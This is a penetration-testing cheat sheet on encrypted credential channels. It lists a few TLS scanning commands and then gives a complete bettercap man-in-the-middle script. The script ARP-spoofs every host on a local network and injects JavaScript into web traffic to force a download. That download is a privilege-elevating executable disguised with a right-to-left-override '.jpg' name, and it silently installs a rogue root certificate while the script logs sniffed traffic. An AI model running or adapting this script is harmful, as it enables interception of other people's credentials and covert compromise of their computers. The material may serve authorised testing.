# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Scan Vulns

#### [cURL](https://curl.se/)

```bash
curl -vk --tlsv1.1 https://$WEBSITE; \
curl -vk --tlsv1.2 https://$WEBSITE; \
curl -vk --tlsv1.3 https://$WEBSITE;
```

#### [testssl.sh](https://github.com/testssl/testssl.sh)

```bash
testssl $WEBSITE
```

#### [SSLyze](https://github.com/nabla-c0d3/sslyze)

```bash
sslyze --regular $WEBSITE
```

### Man In The Middle

#### [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-bettercap.sh
```

```bash
#!/bin/bash
set -euo pipefail

# ========================
# --- CONFIG & COLORS ---
# ========================
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

MITM_DIR="/usr/share/bettercap/caplets/unk9vvn"
BUILD_DIR="$HOME/.wine/drive_c/pyinstaller-build"
ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
RTLO=$'\xE2\x80\xAE'

# ========================
# --- ROOT CHECK ---
# ========================
if [[ "$(id -u)" -ne 0 ]]; then
    color_print RED "[X] Please run as ROOT."
    exit 1
fi

# ========================
# --- NETWORK INFO ---
# ========================
clear
IFACE=$(ip route | awk '/^default/ {print $5; exit}')
LAN=$(hostname -I | awk '{print $1}')
GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')

# ========================
# --- CLEANUP OLD FILES ---
# ========================
color_print YELLOW "[*] Cleaning old files..."
rm -rf "$MITM_DIR" "$BUILD_DIR"
mkdir -p "$MITM_DIR" "$BUILD_DIR"

# ========================
# --- GENERATE FAKE CERTIFICATE ---
# ========================
color_print CYAN "[*] Generating fake certificate..."
CA_CERT_CER="$MITM_DIR/bettercap-ca.crt"
openssl x509 -in "/root/.bettercap-ca.cert.pem" -out $CA_CERT_CER

# ========================
# --- DOWNLOAD AND CREATE ICON ---
# ========================
color_print CYAN "[*] Downloading & creating icon..."
wget -q -O "$MITM_DIR/google.jpg" "$ICON_URL"
convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "$MITM_DIR/google.ico"

# ========================
# --- BUILD CERT INSTALLER EXE ---
# ========================
color_print GREEN "[*] Building Windows cert_installer.exe..."
CERT_B64=$(base64 -w0 "$CA_CERT_CER")
CHUNKS=$(echo "$CERT_B64" | fold -w80 | sed "s/^/\"/" | sed "s/$/\",/")

cat > "$MITM_DIR/cert_installer.py" <<EOF
import ctypes, sys, os, subprocess, tempfile, base64

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

CERT_B64_CHUNKS = [
$CHUNKS
]
CERT_B64 = ''.join(CERT_B64_CHUNKS)
path = os.path.join(tempfile.gettempdir(), "google.cer")
with open(path, "wb") as f:
    f.write(base64.b64decode(CERT_B64))

subprocess.run(["certutil","-addstore","-f","Root", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try: os.remove(path)
except FileNotFoundError: pass
EOF

cat > "$BUILD_DIR/admin.manifest" <<EOF
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
EOF

cp "$MITM_DIR/cert_installer.py" "$BUILD_DIR/"
cp "$MITM_DIR/google.ico" "$BUILD_DIR/"

cd "$BUILD_DIR"
wine pyinstaller --onefile --noconsole \
    --icon "C:\\pyinstaller-build\\google.ico" \
    --name "cert_installer.exe" \
    --manifest "C:\\pyinstaller-build\\admin.manifest" \
    "C:\\pyinstaller-build\\cert_installer.py"

cp "$BUILD_DIR/dist/cert_installer.exe" "$MITM_DIR/cert_installer.exe"

# ========================
# --- CREATE RAR SFX ARCHIVE ---
# ========================
color_print CYAN "[*] Creating SFX archive..."
cat > "$MITM_DIR/sfx.txt" <<EOF
Setup=cert_installer.exe
Presetup=google.jpg
TempMode
Silent=1
Overwrite=1
Update=U
SetupIcon=google.ico
EOF

cd "$MITM_DIR"
rar a -sfx -z"$MITM_DIR/sfx.txt" \
    "/var/www/html/google-update${RTLO}gpj.exe" \
    "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico"

# ========================
# --- SCAN NETWORK AND FORMAT TARGETS ---
# ========================
color_print CYAN "[*] Scanning network..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
    awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
    grep -v -E "^($LAN|$GATEWAY)$" | sort -u | tr '\n' ',' | sed 's/,$//')

# ========================
# --- GENERATE CROSS-BROWSER BETTERCAP JS ---
# ========================
cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
(function() {
    function injectDownloader() {
        try {
            var link = document.createElement('a');
            link.href = 'http://$LAN/google-update${RTLO}gpj.exe';
            link.download = 'google-update.exe';
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            var iframe = document.createElement('iframe');
            iframe.src = 'http://$LAN/google-update${RTLO}gpj.exe';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        } catch(e) { console.error('Injection failed:', e); }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', injectDownloader);
    } else { injectDownloader(); }
})();
EOF

# ========================
# --- GENERATE BETTERCAP CAPLET ---
# ========================
cat > "$MITM_DIR/cert_injector.cap" <<EOF
# --- Enable ARP spoofing ---
arp.spoof on

# --- Enable HTTP and HTTPS proxies ---
http.proxy on
https.proxy on

# --- Inject JS into HTTP and HTTPS traffic ---
set http.proxy.injectjs.file $MITM_DIR/rtlo_downloader.js
set https.proxy.injectjs.file $MITM_DIR/rtlo_downloader.js

# --- Network sniffing ---
net.sniff on

# --- Log sniffed traffic ---
events.stream on
events.stream.output /tmp/mitm.log
events.stream.filter "http.request or http.response"
EOF
chmod +x "$MITM_DIR/cert_injector.cap"

# ========================
# --- RESTART APACHE SERVER ---
# ========================
color_print GREEN "[*] Restarting Apache..."
service apache2 restart

# ========================
# --- LAUNCH BETTERCAP ---
# ========================
color_print GREEN "[*] Launching Bettercap..."
bettercap -iface "$IFACE" -eval "set arp.spoof.targets $TARGETS;caplets.update;unk9vvn/cert_injector"
```

_Run & Execute_

```bash
sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
```
